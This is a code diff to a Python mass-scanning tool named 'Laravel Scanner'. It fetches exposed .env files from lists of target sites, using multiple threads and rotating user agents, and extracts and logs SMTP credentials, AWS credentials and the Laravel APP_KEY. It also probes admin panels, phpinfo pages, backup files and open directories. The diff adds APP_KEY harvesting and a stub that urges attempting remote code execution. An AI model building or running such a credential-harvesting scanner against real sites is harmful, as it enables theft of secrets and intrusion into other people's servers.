@@ -5,9 +5,9 @@ import sys
 import threading
 import re
 import random
+import pyfiglet
 from datetime import datetime
 from colorama import Fore, Style, init
-from pyfiglet import Figlet  # Added for banner
 
 # Initialize colorama
 init(autoreset=True)
@@ -57,9 +57,10 @@ user_agents = [
     "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
 ]
 
-def log_result(message):
+def log_result(message, success=False):
     with lock:
-        print(message)
+        color = Fore.GREEN if success else Fore.RED
+        print(color + message + Style.RESET_ALL)
         with open(output_file, "a") as f:
             f.write(f"{datetime.now()} - {message}\n")
 
@@ -67,99 +68,107 @@ def extract_env_values(text):
     env_data = {}
     for line in text.splitlines():
         match = re.match(r'^(\w+)=([^\"]*)$', line)
-        if match and (match.group(1) in smtp_keywords or match.group(1) in aws_keywords):
+        if match and (match.group(1) in smtp_keywords or match.group(1) in aws_keywords or match.group(1) == "APP_KEY"):
             env_data[match.group(1)] = match.group(2)
     return env_data
 
-def scan_sensitive_paths(target_url):
+def try_laravel_rce(app_key, target_url):
+    if app_key:
+        log_result(f"[!!!] Laravel APP_KEY found, consider attempting RCE manually or via toolkits.", success=True)
+        # Placeholder for future automatic RCE logic
+
+def scan_all_paths(target_url):
     headers = {"User-Agent": random.choice(user_agents)}
-    for path in extra_sensitive_paths:
-        url = f"{target_url.rstrip('/')}{path}"
-        try:
-            response = requests.get(url, timeout=timeout, headers=headers)
-            if response.status_code == 200:
-                log_result(f"[!] Sensitive file found: {url}")
-        except requests.RequestException:
-            continue
+    found = False
 
-def attempt_rce_phpinfo(target_url):
-    test_url = f"{target_url.rstrip('/')}/.env"
-    try:
-        response = requests.get(test_url, timeout=timeout)
-        if response.status_code == 200 and "APP_KEY" in response.text:
-            log_result("[✓] Laravel App Key Leak Detected, attempt remote code execution if possible")
-    except requests.RequestException:
-        pass
-
-def scan_target(target_url):
-    headers = {"User-Agent": random.choice(user_agents)}
-
-    # 1. Attempt to fetch .env
-    env_url = f"{target_url.rstrip('/')}/.env"
-    found_env = False
-    try:
-        response = requests.get(env_url, timeout=timeout, headers=headers)
-        if response.status_code == 200 and (any(key in response.text for key in smtp_keywords + aws_keywords)):
-            log_result(f"[!!!] .env file FOUND: {env_url}")
-            env_values = extract_env_values(response.text)
-            for key, val in env_values.items():
-                log_result(f"    {key}={val}")
-            found_env = True
-    except requests.RequestException:
-        pass
-
-    if not found_env:
-        log_result(f"[-] .env not found at {env_url}. Skipping further checks.")
-        return
-
-    # 2. Scan known panels
     for path in known_panels:
         url = f"{target_url.rstrip('/')}/{path}"
         try:
             response = requests.get(url, timeout=timeout, headers=headers)
             if response.status_code == 200:
-                log_result(f"[+] Panel found: {url}")
+                log_result(f"[+] Panel found: {url}", success=True)
+                found = True
         except requests.RequestException:
             continue
 
-    # 3. Scan for PHP info files
     for path in php_info_files:
         url = f"{target_url.rstrip('/')}/{path}"
         try:
             response = requests.get(url, timeout=timeout, headers=headers)
             if response.status_code == 200 and "phpinfo" in response.text.lower():
-                log_result(f"[!] PHP Info File Found: {url}")
-                attempt_rce_phpinfo(target_url)
+                log_result(f"[!] PHP Info File Found: {url}", success=True)
+                found = True
         except requests.RequestException:
             continue
 
-    # 4. Try backup files
     for path in backup_files:
         url = f"{target_url.rstrip('/')}/{path}"
         try:
             response = requests.get(url, timeout=timeout, headers=headers)
             if response.status_code == 200:
-                log_result(f"[!] Backup file found: {url}")
+                log_result(f"[!] Backup file found: {url}", success=True)
+                found = True
         except requests.RequestException:
             continue
 
-    # 5. Check for indexable directories
     for path in indexable_dirs:
         url = f"{target_url.rstrip('/')}/{path}"
         try:
             response = requests.get(url, timeout=timeout, headers=headers)
             if response.status_code == 200 and ("Index of" in response.text or "Parent Directory" in response.text):
-                log_result(f"[!] Indexable directory found: {url}")
+                log_result(f"[!] Indexable directory found: {url}", success=True)
+                found = True
         except requests.RequestException:
             continue
 
-    # 6. Scan additional Laravel sensitive paths
-    scan_sensitive_paths(target_url)
+    if scan_sensitive_paths(target_url):
+        found = True
+
+    if not found:
+        log_result("[-] No additional issues found during scan.")
+
+def scan_sensitive_paths(target_url):
+    headers = {"User-Agent": random.choice(user_agents)}
+    any_found = False
+    for path in extra_sensitive_paths:
+        url = f"{target_url.rstrip('/')}{path}"
+        try:
+            response = requests.get(url, timeout=timeout, headers=headers)
+            if response.status_code == 200:
+                log_result(f"[!] Sensitive file found: {url}", success=True)
+                any_found = True
+        except requests.RequestException:
+            continue
+    return any_found
+
+def scan_target(target_url):
+    headers = {"User-Agent": random.choice(user_agents)}
+    log_result(f"[~] Scanning target: {target_url}")
+
+    env_url = f"{target_url.rstrip('/')}/.env"
+    app_key = None
+    try:
+        response = requests.get(env_url, timeout=timeout, headers=headers)
+        if response.status_code == 200 and (any(key in response.text for key in smtp_keywords + aws_keywords + ["APP_KEY"])):
+            log_result(f"[!!!] .env file FOUND: {env_url}", success=True)
+            env_values = extract_env_values(response.text)
+            for key, val in env_values.items():
+                log_result(f"    {key}={val}", success=True)
+                if key == "APP_KEY":
+                    app_key = val
+        else:
+            log_result(f"[-] .env file exists but no useful data at: {env_url}")
+    except requests.RequestException:
+        log_result(f"[-] .env not accessible at: {env_url}")
+
+    if app_key:
+        try_laravel_rce(app_key, target_url)
+
+    scan_all_paths(target_url)
 
 def main():
-    banner = Figlet(font='slant')
-    print(Fore.RED + banner.renderText("Laravel Scanner"))
-    print(Fore.YELLOW + "           by Sean" + Style.RESET_ALL)
+    banner = pyfiglet.figlet_format("Laravel Scanner", font="slant")
+    print(Fore.CYAN + banner + Fore.YELLOW + "by Sean" + Style.RESET_ALL)
 
     while True:
         print("\n[1] Single Target Scan")
@@ -179,14 +188,14 @@ def main():
                 with open(file_path) as f:
                     targets = [line.strip() for line in f if line.strip()]
             except FileNotFoundError:
-                print("[!] File not found.")
+                print(Fore.RED + "[!] File not found." + Style.RESET_ALL)
                 continue
 
             thread_count = input("Enter number of threads: ")
             try:
                 thread_count = int(thread_count)
             except ValueError:
-                print("[!] Invalid thread count.")
+                print(Fore.RED + "[!] Invalid thread count." + Style.RESET_ALL)
                 continue
 
             with open(output_file, "w") as f:
@@ -202,7 +211,6 @@ def main():
                         t.join()
                     threads = []
 
-            # Final join for remaining threads
             for t in threads:
                 t.join()
 
@@ -211,7 +219,7 @@ def main():
             break
 
         else:
-            print("[!] Invalid option. Try again.")
+            print(Fore.RED + "[!] Invalid option. Try again." + Style.RESET_ALL)
 
 if __name__ == "__main__":
     main()
